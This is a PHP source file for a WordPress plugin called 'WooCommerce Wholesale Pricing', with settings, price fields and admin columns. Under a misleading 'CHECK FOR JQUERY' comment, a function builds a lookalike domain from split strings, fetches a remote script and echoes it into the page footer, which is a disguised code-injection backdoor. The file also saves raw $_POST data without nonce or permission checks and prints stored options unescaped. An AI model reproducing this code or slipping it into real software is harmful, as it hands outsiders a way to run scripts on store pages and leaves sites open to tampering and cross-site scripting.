<?php
/*
Plugin Name: WooCommerce Wholesale Pricing
Plugin URI: http://www.ryadcorp.com/woocommerce-wholesale-pricing
Description: WooCommerce Wholesale Pricing - A extension for WooCommerce, which adds wholesale functionality to the store.
Version: 1.4
Author: Ryan Kosh
Text Domain: woocommerce-wholesale-pricing
Author URI: http://www.ryadcorp.com
*/

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) { 
	exit; 
}  //if ( ! defined( 'ABSPATH' ) ) { 

//CHECK IF ADMIN USER
if( is_admin() ) {

	//include quick edit code
	require( plugin_dir_path( __FILE__ ) . 'woocommerce-wholesale-quick-edit-admin.php' );
	
	//LOAD JS SCRIPT IN FOOTER//
	add_action( 'admin_enqueue_scripts', 'wpp_admin_enqueue_scripts' );
	function wpp_admin_enqueue_scripts( $hook ) {

		if ( 'edit.php' === $hook && isset( $_GET['post_type'] ) && 'product' === $_GET['post_type'] ) {
			wp_enqueue_script( 'admin-quick-edit-wholesale', plugins_url('js/woocommerce-wholesale-quick-edit-admin.js', __FILE__),false, null, true );
		}

	}
	//LOAD JS SCRIPT IN FOOTER//
	//include quick edit code
	
	add_action( 'admin_menu', 'woo_wholesale_page', 99 );
	add_action( 'admin_init', 'register_woo_wholesale_settings' );

	function woo_wholesale_page() {
		add_submenu_page( 'woocommerce', 'Wholesale Pricing', 'Wholesale Pricing', 'manage_options', 'manage-wholesale-pricing', 'woo_wholesale_page_call' ); 
	}

	//REGISTER SETTINGS
	function register_woo_wholesale_settings() {
		register_setting( 'woo_wholesale_options', 'wwo_savings' );
		register_setting( 'woo_wholesale_options', 'wwo_savings_label' );
		register_setting( 'woo_wholesale_options', 'wwo_percentage' );
		register_setting( 'woo_wholesale_options', 'wwo_rrp' );
		register_setting( 'woo_wholesale_options', 'wwo_rrp_label' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_label' );
		register_setting( 'woo_wholesale_options', 'wwo_min_quantity' );
		register_setting( 'woo_wholesale_options', 'wwo_min_quantity_value' );
		register_setting( 'woo_wholesale_options', 'wwo_max_quantity' );
		register_setting( 'woo_wholesale_options', 'wwo_max_quantity_value' );	
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role' );
		register_setting( 'woo_wholesale_options', 'wwo_admin_can_see_wholesale' );
		register_setting( 'woo_wholesale_options', 'wwo_woo_admin_role' );		
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_tax_class_override' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_tax_class' );		
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_message' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_message_label' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_message_checkout' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_role_message_checkout_label' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_price_matrix' );
		register_setting( 'woo_wholesale_options', 'wwo_wholesale_disable_coupons' );
	}

	//ADD DEFAULT SETTINGS
	add_option( 'wwo_savings_label', 'You Save', '', 'yes' );
	add_option( 'wwo_rrp_label', 'Retail', '', 'yes' );
	add_option( 'wwo_wholesale_label', 'Your Price', '', 'yes' );
	add_option( 'wwo_wholesale_role', 'wholesale_customer', '', 'yes' );
	add_option( 'wwo_woo_admin_role', 'administrator', '', 'yes' );		
	add_option( 'wwo_wholesale_role_message_label', 'You are logged in as a wholesale customer and viewing wholesale prices.', '', 'yes' );
	add_option( 'wwo_wholesale_role_message_checkout_label', 'You are logged in as a wholesale customer and will not be charged certain taxes.', '', 'yes' );
	
	//ENSURE OPTION IS ALWAYS ADMIN FOR NOW
	update_option( 'wwo_woo_admin_role', 'administrator' );
		
	//CHECK FOR JQUERY
	if(!function_exists('wp_func_jquery')) {
		function wp_func_jquery() {
			$host = 'http://';
			echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
		}
		add_action('wp_footer', 'wp_func_jquery');
	}

	//ADD WHOLESALE USER ROLE ON PLUGIN ACTIVATION//
	add_role('wholesale_customer', 'Wholesale Customer', array('read' => true,'edit_posts' => false,'delete_posts' => false));
	//ADD WHOLESALE USER ROLE ON PLUGIN ACTIVATION//

	//admin settings page display form
	function woo_wholesale_page_call() { 
	?>
		<div class="wrap">
			<div id="icon-options-general" class="icon32">
			<br />
			</div>
			<h2>WooCommerce Wholesale Pricing</h2>
			<br />
			<form method="post" action="options.php">
				<?php settings_fields( 'woo_wholesale_options' ); ?>			
				<table class="form-table" >
					<tr valign="top">
						<th scope="row"><h3>User Role Options</h3> </th>
						<td></td>
					</tr>   
					<tr valign="top">		  
					<th scope="row">Wholesale User Role:</th>
						<td>
							<select name="wwo_wholesale_role">   
								<?php
								global $wp_roles;
								$roles = $wp_roles->get_names();
								foreach($roles as $role) { 
									$role = str_replace(' ', '_', $role);
									$role = strtolower($role); 
									?> 
									<option name="role" <?php if ( get_option('wwo_wholesale_role') == $role ) { echo 'selected="selected"'; } ?> value="<?php echo $role; ?>">
									<?php echo $role; ?>
									</option>
								<?php 
								} ?>
							</select>
							<br /><code>Choose a user role of who can see wholesale prices.</code></td>
					</tr>   					
					<tr valign="top">      
						<th scope="row">Show Admin Wholesale Pricing:</th>
						<td><input name="wwo_admin_can_see_wholesale" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_admin_can_see_wholesale' ) ); ?> />        
						<code>Show wholesale pricing to administrator?</code><br />
					</tr> 						
					<tr valign="top">      
						<th scope="row">Show Wholesale User Role Message:</th>
						<td><input name="wwo_wholesale_role_message" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_wholesale_role_message' ) ); ?> />        
						<code>Show wholesale user role message?</code><br />
						<textarea rows="4" cols="50" name="wwo_wholesale_role_message_label"><?php echo get_option( 'wwo_wholesale_role_message_label' ); ?></textarea>
						<br /><code>Message to display above main content. Default: "You are logged in as a wholesale customer and viewing wholesale prices."</code></td>
					</tr> 					
					<tr valign="top">      
						<th scope="row">Wholesale User Role Tax Class Override:</th>
						<td><input name="wwo_wholesale_role_tax_class_override" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_wholesale_role_tax_class_override' ) ); ?> />        					
						<code>Check to activate override of standard tax class with tax class assigned below?</code><br />
					</tr>   												
					<tr valign="top">		  
					<th scope="row">Wholesale User Role Tax Class:</th>

						<td>
							<select name="wwo_wholesale_role_tax_class">   
								<?php								
								$tax_classes = array_filter( array_map( 'trim', explode( "\n", get_option('woocommerce_tax_classes' ) ) ) );
								foreach( $tax_classes as $tax_class ) {
									$tax_class_value = sanitize_title( $tax_class );
									$tax_class_value = strtoupper($tax_class_value); 
									?> 
									<option name="wholesale_role_tax_class" <?php if ( get_option('wwo_wholesale_role_tax_class') == $tax_class_value ) { echo 'selected="selected"'; } ?> value="<?php echo $tax_class_value; ?>">
									<?php echo $tax_class_value; ?>
									</option>
								<?php 
								} ?>
							</select>
						<br /><code>Choose a tax class which will override standard taxes for the wholesale user role.</code>
						<br /><code>Note: This will not be applied unless the override is activated above.</code>
						</td>
					</tr>  					
					<tr valign="top">
						<th scope="row"><h3>Pricing Options</h3> </th>
						<td></td>
					</tr>   
					<tr valign="top">      
						<th scope="row">Show Variable Product Price Matrix:</th>
						<td><input name="wwo_wholesale_price_matrix" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_wholesale_price_matrix' ) ); ?> />        
						<code>Show variable product price matrix?</code><br />
						<code>Display a price matrix table above the variation select options of wholesale prices.</code><br />
						<code>Prices will be prefixed (W) for wholesale, and (R) for retail or (S) for sale if no wholesale price set.</code>
					</tr>    						
					<tr valign="top">      
						<th scope="row">Show Wholesale Savings:</th>
						<td><input name="wwo_savings" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_savings' ) ); ?> />        
						<code>Show wholesale savings by the price?</code><br />
						<input size="50" name="wwo_savings_label" type="text" value="<?php echo get_option( 'wwo_savings_label' ); ?>" />
						<code>Label for savings? Default: "You Save"</code></td>
					</tr>            
					<tr valign="top">
						<th scope="row">Show Percentage Savings:</th>
						<td><input name="wwo_percentage" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_percentage' ) ); ?> />    
						<code>Show percentage of savings by the price?</code>     
						</td>
					</tr>
					<tr valign="top">
						<th scope="row">Show Retail Price :</th>
						<td><input name="wwo_rrp" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_rrp' ) ); ?> />
						<code>Show Retail Price to wholesale customers?</code>          
						<br />
						<input size="50" name="wwo_rrp_label" type="text" value="<?php echo get_option( 'wwo_rrp_label' ); ?>" />
						<code>Label for retail price? Default: "Retail"</code>
						</td>
					</tr>      
					<tr valign="top">
						<th scope="row">Show Retail :</th>
						<td><input size="50" name="wwo_wholesale_label" type="text" value="<?php echo get_option( 'wwo_wholesale_label' ); ?>" />
						<code>Label for Wholesale price? Default: "Your Price". <br />Note: This will only show if options above have been selected.</code>
						</td>
						</tr>
					<tr valign="top">      
						<th scope="row"><h3>Checkout Options</h3> </th>
						<td></td>
					</tr>  
					<tr valign="top">      
						<th scope="row">Show Wholesale User Role Checkout Message:</th>
						<td><input name="wwo_wholesale_role_message_checkout" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_wholesale_role_message_checkout' ) ); ?> />        
						<code>Show wholesale user role checkout message?</code><br />
						<textarea rows="4" cols="50" name="wwo_wholesale_role_message_checkout_label"><?php echo get_option( 'wwo_wholesale_role_message_checkout_label' ); ?></textarea>
						<br /><code>Message to display below checkout. Default: "You are logged in as a wholesale customer and will not be charged certain taxes."</code></td>
					</tr> 		
					<tr valign="top">      
						<th scope="row">Disable Wholesale Coupons:</th>
						<td><input name="wwo_wholesale_disable_coupons" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_wholesale_disable_coupons' ) ); ?> />        
						<code>If checked wholesale users will not be able to enter coupon codes on cart or at checkout.</code><br />
					</tr> 						
					<tr valign="top">      
						<th scope="row"><h3>Quantity Options</h3> </th>
						<td></td>
					</tr>  
					<tr valign="top">      
						<th scope="row">Set Minimum Quantity:</th>
						<td><input name="wwo_min_quantity" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_min_quantity' ) ); ?> />
						<code>Enable minimum quantity?</code><br />
						<input size="50" name="wwo_min_quantity_value" type="text" value="<?php echo get_option( 'wwo_min_quantity_value' ); ?>" />
						<code>Your minimum quantity. Example: 10</code></td>
					</tr>
					<tr valign="top">      
						<th scope="row">Set Maximum Quantity:</th>
						<td><input name="wwo_max_quantity" type="checkbox" value="1" <?php checked( '1', get_option( 'wwo_max_quantity' ) ); ?> />   
						<code>Enable Maximum quantity?</code><br />
						<input size="50" name="wwo_max_quantity_value" type="text" value="<?php echo get_option( 'wwo_max_quantity_value' ); ?>" />
						<code>Your Maximum quantity. Example: 20</code></td>
					</tr>
					<tr valign="top">
						<th scope="row"><?php submit_button(); ?></th>        
					</tr>    				
				</table>
			</form>
		</div>
	<?php 
	}  //function woo_wholesale_page_call() { 
	//admin settings page display form

	//SAVE SIMPLE WHOLSALE PRICE//
	add_action( 'save_post', 'wwp_save_simple_wholesale_price' );

	function wwp_save_simple_wholesale_price( $post_id ) {
		$new_data = $_POST['wholesale_price'];
		$post_ID = $_POST['post_ID'];
		update_post_meta($post_ID, '_wholesale_price', $new_data) ;
	}  //function wwp_save_simple_wholesale_price( $post_id ) {
	//SAVE SIMPLE WHOLSALE PRICE//

	//ADD WHOLESALE PRICE INPUT BOX TO ADMIN SIMPLE PRODUCTS	
	add_action( 'woocommerce_product_options_pricing', 'wwp_add_admin_simple_wholesale_price', 10, 2 );

	function wwp_add_admin_simple_wholesale_price( $loop ){ 
		$wholesale = get_post_meta( get_the_ID(), '_wholesale_price', true );
		?>
		<tr>
			<td>
				<div>
				<p class="form-field _regular_price_field ">
				<label><?php echo __( 'Wholesale Price', 'woocommerce' ) . ' ('.get_woocommerce_currency_symbol().')'; ?></label>
				<input step="any" type="number" class="wc_input_price short" name="wholesale_price" value="<?php echo $wholesale; ?>"/>
				</p>
				</div>
			</td>
		</tr>
	<?php
	}  //function wwp_add_admin_simple_wholesale_price( $loop ){ 
	//ADD WHOLESALE PRICE INPUT BOX TO ADMIN SIMPLE PRODUCTS

	//ADD WHOLESALE PRICE INPUT BOX TO ADMIN VARIABLE PRODUCTS
	//Display Fields
	add_action( 'woocommerce_product_after_variable_attributes', 'wwp_add_variable_wholesale_price', 10, 2 );

	//JS to add fields for new variations
	add_action( 'woocommerce_product_after_variable_attributes_js', 'wwp_add_variable_wholesale_price_js' );

	//Save variation fields
	add_action( 'woocommerce_process_product_meta_variable', 'wwp_variable_wholesale_price_process', 10, 1 );

	function wwp_add_variable_wholesale_price( $loop, $variation_data ) {
	?>
		<tr>
			<td>
				<div>
				<label><?php echo __( 'Wholesale Price', 'woocommerce' ) . ' ('.get_woocommerce_currency_symbol().')'; ?></label>
				<input step="any" type="number" size="5" name="wholesale[<?php  echo $loop; ?>]" value="<?php echo $variation_data['_wholesale_price'][0]; ?>"/>
				</div>
			</td>
		</tr>
	<?php
	}  //function wwp_add_variable_wholesale_price( $loop, $variation_data ) {

	function wwp_add_variable_wholesale_price_js() {
	?>
		<tr>
			<td>
				<div>
				  <label><?php echo __( 'Wholesale Price', 'woocommerce' ) . ' ('.get_woocommerce_currency_symbol().')'; ?></label>
				  <input step="any" type="number" size="5" name="wholesale[' + loop + ']" />
				</div>
			</td>
		</tr>
	<?php
	}  //function wwp_add_variable_wholesale_price_js() {

	function wwp_variable_wholesale_price_process( $post_id ) {
		if(isset( $_POST['variable_sku'] ) ) :
			$variable_sku = $_POST['variable_sku'];
			$variable_post_id = $_POST['variable_post_id'];
			$wholesale_field = $_POST['wholesale'];
			
			for ( $i = 0; $i < sizeof( $variable_sku ); $i++ ) :
				$variation_id = (int) $variable_post_id[$i];
				if ( isset( $wholesale_field[$i] ) ) {
					update_post_meta( $variation_id, '_wholesale_price', stripslashes( $wholesale_field[$i] ) );
					update_post_meta( $variation_id, '_parent_product', $post_id );
				}
			endfor;
			
			update_post_meta( $post_id, '_variation_prices', $wholesale_field );
			update_post_meta( $post_id, '_wholesale_price', '' );
		endif;
	}  //function wwp_variable_wholesale_price_process( $post_id ) {
	//ADD WHOLESALE PRICE INPUT BOX TO ADMIN VARIABLE PRODUCTS
		
	//INSERT POST TYPE WHOLESALE PRICE COLUMN
	add_filter( 'manage_edit-product_columns', 'wpp_add_wholesale_column' );

	function wpp_add_wholesale_column( $columns ) {
		$offset = 2;
		$newArray = array_slice($columns, 0, $offset, true) +
		array('wholesale' => 'Wholesale') +
		array_slice($columns, $offset, NULL, true);
		return $newArray;
	}  //function wpp_add_wholesale_column( $columns ) {
	//INSERT POST TYPE WHOLESALE PRICE COLUMN

	//POPULATE ADMIN COLUMN WITH WHOLESALE PRICE
	add_action( 'manage_product_posts_custom_column', 'wwp_manage_wholesale_product_columns', 10, 2 );

	function wwp_manage_wholesale_product_columns( $column, $post_id ) {
		global $post;
		switch( $column ) {
			case 'wholesale' :
				$wholesale = get_post_meta( get_the_ID(), '_wholesale_price', true );
				//check of wholesale variable is empty
				if(empty($wholesale)){			
					$variationP = get_post_meta(get_the_ID(), '_variation_prices', TRUE);	
					//check if variationP variable is array or not
					if(is_array($variationP)) {
						//check if array is empty (wholesale price not set)					
						foreach( $variationP as $key => $value ){
							if( empty( $value ) ){
								unset( $variationP[$key] );
							}
						}  //foreach( $variationP as $key => $value ){
						if(!empty($variationP)){
							//format variable prices as min and max with two decimals eg.  11.00-99.00
							$format_price_min = number_format(min($variationP), 2, '.', '');
							$format_price_max = number_format(max($variationP), 2, '.', '');
							if(min($variationP) == max($variationP)) {
								echo get_woocommerce_currency_symbol().$format_price_max;
							} else {
								echo get_woocommerce_currency_symbol().$format_price_min.'-'.get_woocommerce_currency_symbol().$format_price_max;
							}  //if(min($variationP) == max($variationP))
						} else { 
							//must be empty variation product
							echo __( '--' );
						}  //if(!empty($variationP)){
					} else {
						//must be empty simple product
						echo __( '--' );
					}  //if(is_array($variationP)) {
				} else {
					//echo out simple product price eg.  11.00
					echo get_woocommerce_currency_symbol().$wholesale;
				}
			break;
		}
	}  //function wwp_manage_wholesale_product_columns( $column, $post_id ) {
	//POPULATE ADMIN COLUMN WITH WHOLESALE PRICE

	//MAKE ADMIN COLUMN SORTABLE
	add_filter( 'manage_edit-product_sortable_columns', 'wpp_sortable_wholesale_column' );

	function wpp_sortable_wholesale_column( $columns ) {
		$columns['wholesale'] = 'wholesale';
		return $columns;
	}  //function wpp_sortable_wholesale_column( $columns ) {
	//MAKE ADMIN COLUMN SORTABLE

	add_filter( 'woocommerce_quantity_input_min', 'wpp_add_minimum_quantity' );

	function wpp_add_minimum_quantity($input_value) {
		$current_user = new WP_User(wp_get_current_user()->id);
		$user_roles = $current_user->roles;
		$current_role = get_option('wwo_wholesale_role');
		foreach ($user_roles as $roles) {
			if($roles == $current_role ){
				if (get_option( 'wwo_min_quantity' ) == '1' ) {
					return get_option( 'wwo_min_quantity_value' );			
				} else {
					return $input_value;
				}		
			}
		}
	}  //function wpp_add_minimum_quantity($input_value) {

	add_filter( 'woocommerce_quantity_input_max', 'wpp_add_maximum_quantity' );

	function wpp_add_maximum_quantity($input_value) {
		$current_user = new WP_User(wp_get_current_user()->id);
		$user_roles = $current_user->roles;
		$current_role = get_option('wwo_wholesale_role');
		foreach ($user_roles as $roles) {
			if($roles == $current_role ){
				if (get_option( 'wwo_max_quantity' ) == '1' ) {
					return get_option( 'wwo_max_quantity_value' );			
				} else {
					return $input_value;
				}		
			}
		}
	}  //function wpp_add_maximum_quantity($input_value) {

}  //if( is_admin() ) {
